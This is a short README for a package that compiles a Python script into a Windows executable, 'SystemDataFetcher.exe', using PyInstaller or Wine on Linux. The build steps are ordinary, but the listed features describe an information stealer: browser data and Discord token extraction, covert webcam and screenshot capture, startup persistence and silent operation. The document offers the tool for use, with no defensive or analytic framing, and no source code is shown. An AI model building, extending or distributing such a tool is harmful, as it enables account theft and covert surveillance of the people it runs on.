# Windows EXE Builder Package

This package contains:
- `hi.py` - The main Python script
- `build_windows_exe.sh` - Linux script to build Windows executable
- `build_with_wine.sh` - Alternative Wine-based builder for better Windows compatibility

## Usage Instructions

### Method 1: Standard PyInstaller (Recommended)
```bash
chmod +x build_windows_exe.sh
./build_windows_exe.sh
```

### Method 2: Wine-based Builder (Better Windows compatibility)
```bash
chmod +x build_with_wine.sh
./build_with_wine.sh
```

## Requirements
- Linux system
- Python 3.6+
- pip3
- For Wine method: Wine package manager

## Output
- The Windows executable will be created in the `dist/` folder
- File name: `SystemDataFetcher.exe`
- The .exe can run on Windows 7+ (64-bit) without Python installed

## Features
The generated executable includes:
- System information gathering
- Browser data extraction
- Network information
- Screenshot capture (Windows only)
- Webcam capture
- Discord token extraction
- Startup persistence
- Silent operation mode

## Notes
- The executable is compiled for Windows from Linux
- File size will be approximately 50-100MB due to Python runtime
- All dependencies are bundled in the single executable
